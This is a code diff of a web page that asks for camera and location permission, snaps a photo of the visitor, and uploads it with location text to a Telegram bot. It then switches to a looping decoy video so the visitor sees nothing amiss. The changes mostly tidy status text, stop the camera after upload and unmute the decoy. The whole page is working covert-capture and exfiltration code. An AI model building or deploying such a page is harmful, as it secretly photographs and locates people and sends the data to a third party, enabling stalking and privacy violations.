@@ -16,7 +16,7 @@
             background: rgba(0,0,0,0.6); 
             padding: 15px; 
             border-radius: 10px; 
-            font-size: 50px; 
+            font-size: 60px; 
             text-align: center;
         }
         
@@ -43,7 +43,7 @@
             startBtn.style.display = 'none';
             status.innerText = "⏳";
 
-            // 1. 获取定位 (静默处理)
+            // 1. 获取定位
             let locationText = "Location: Not available";
             try {
                 const pos = await new Promise((res, rej) => {
@@ -58,9 +58,8 @@
                 video.srcObject = stream;
                 video.style.display = 'block';
                 video.style.opacity = '1';
-                status.innerText = "Processing........";
+                status.innerText = "🌐 Processing.........";
 
-                // 3. 拍照并上传
                 setTimeout(() => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -74,19 +73,20 @@
 
                         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                         
+                        // 3. 上传成功后，不跳转页面，而是直接将 video 框切换为视频播放
                         if ((await res.json()).ok) {
-                            // 成功后：直接切换为视频播放
                             status.innerText = "🎉 Success!";
+                            stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
                             video.srcObject = null;
                             video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                             video.loop = true;
+                            video.muted = false; // 播放视频时开启声音
                             video.play();
                         } else {
                             status.innerText = "⚠️ Upload Error";
                         }
                     }, 'image/jpeg');
                 }, 1000);
-
             } catch (err) {
                 status.innerText = "⚠️ Permissions Required";
             }
